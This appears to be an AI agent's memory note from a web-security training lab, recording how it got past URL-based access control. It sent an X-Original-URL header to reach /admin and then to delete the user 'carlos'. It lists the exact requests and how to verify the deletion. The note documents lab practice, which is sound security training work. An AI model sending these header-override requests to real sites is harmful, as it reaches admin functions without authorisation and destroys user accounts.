---
metadata:
  node_type: memory
name: "PRS arm A url-based access control circumvented"
description: "arm A baseline: lab-url-based-access-control-can-be-circumvented 一次通过 - X-Original-URL:/admin 读面板, /admin/delete?username=carlos 删除, banner solved"
last_updated: 2026-10-08T18:34:15+08:00
created: 2026-10-08T18:34:15+08:00
---

## 2026-10-08 arm A baseline: lab-url-based-access-control-can-be-circumvented

Cold instance (reused:false), solved in one chain, no stuck points.

- Lab id: 9955f5350904edabe30089828d2c08ace886493264a0b469354503102379a3e9 (via page_read).
- range_launch --jar /tmp/cj1.json -> instance 0adb00a0037c1e5d82be791100230061.
- Recon: GET / with header `X-Original-URL: /admin` -> front-end sees path `/` (allowed), back-end routes to /admin -> 200 admin user list (wiener, carlos).
- Delete: GET `/?username=carlos` with `X-Original-URL: /admin/delete` -> 302 Location /admin (back-end processed it; the followed redirect is front-end-blocked 403, a red herring, not a failure).
- Confirm: re-read via X-Original-URL: /admin shows "User deleted successfully!" and only wiener remains; banner_verdict solved:true.

Note: the delete step returns 302->/admin 403 on --follow; do not read that 403 as "blocked" - the X-Original-URL request itself succeeded (the Location is computed for the blocked path). Verify with a fresh X-Original-URL read or banner_verdict instead of trusting the followed hop.

